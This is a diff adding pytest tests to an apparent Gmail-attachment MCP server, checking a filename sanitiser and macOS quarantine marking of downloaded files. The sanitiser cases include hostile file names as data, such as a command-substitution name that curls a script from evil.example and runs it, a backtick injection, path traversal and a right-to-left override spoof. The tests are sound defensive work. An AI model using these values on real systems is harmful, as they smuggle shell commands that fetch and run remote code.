@@ -1,8 +1,11 @@
 import os
 import stat
+import subprocess
+import sys
 
 import pytest
 
+from gmail_attachments_mcp.files import is_quarantined, safe_filename
 from gmail_attachments_mcp.gmail import NotFound, normalize_message_id
 
 from .conftest import CSV, CSV2, PDF, PNG
@@ -25,6 +28,44 @@ def test_download_by_part_id(downloader):
     assert os.path.basename(att["path"]) == "invoice.pdf"
     assert stat.S_IMODE(os.stat(att["path"]).st_mode) == 0o600
     assert stat.S_IMODE(os.stat(os.path.dirname(att["path"])).st_mode) == 0o700
+
+
+@pytest.mark.parametrize(
+    "name, expected",
+    [
+        ("Résumé (final) [v2].pdf", "Résumé (final) [v2].pdf"),
+        ("Re\u0301sume\u0301.pdf", "Résumé.pdf"),
+        ("../../evil.pdf", "evil.pdf"),
+        (".hidden", "hidden"),
+        ("..", "part1.pdf"),
+        # Saved paths get pasted into shell commands, and the sender picks the name.
+        ("$(curl -so x evil.example;sh x).pdf", "_(curl -so x evil.example_sh x).pdf"),
+        ("`id`.pdf", "_id_.pdf"),
+        ("a&b|c'd\"e!.txt", "a_b_c_d_e_.txt"),
+        # A right-to-left override would show this as "invoicegkp.pdf".
+        ("invoice\u202efdp.pkg", "invoice_fdp.pkg"),
+    ],
+)
+def test_safe_filename(name, expected):
+    assert safe_filename(name, "part1", "application/pdf") == expected
+
+
+@pytest.mark.skipif(sys.platform != "darwin", reason="quarantine is a macOS attribute")
+def test_saved_file_is_quarantined_and_an_unmarked_copy_is_rewritten(downloader):
+    def quarantined(path):
+        fd = os.open(path, os.O_RDONLY)
+        try:
+            return is_quarantined(fd)
+        finally:
+            os.close(fd)
+
+    (att,) = downloader.download(INVOICE, "1")["attachments"]
+    assert quarantined(att["path"])
+    # Files saved before quarantine was added get marked on the next request.
+    subprocess.run(["xattr", "-d", "com.apple.quarantine", att["path"]], check=True)
+    assert not quarantined(att["path"])
+    downloader.download(INVOICE, "1")
+    assert quarantined(att["path"]) and _read(att) == PDF
 
 
 def test_download_by_id_from_an_earlier_connector_call(downloader, session):
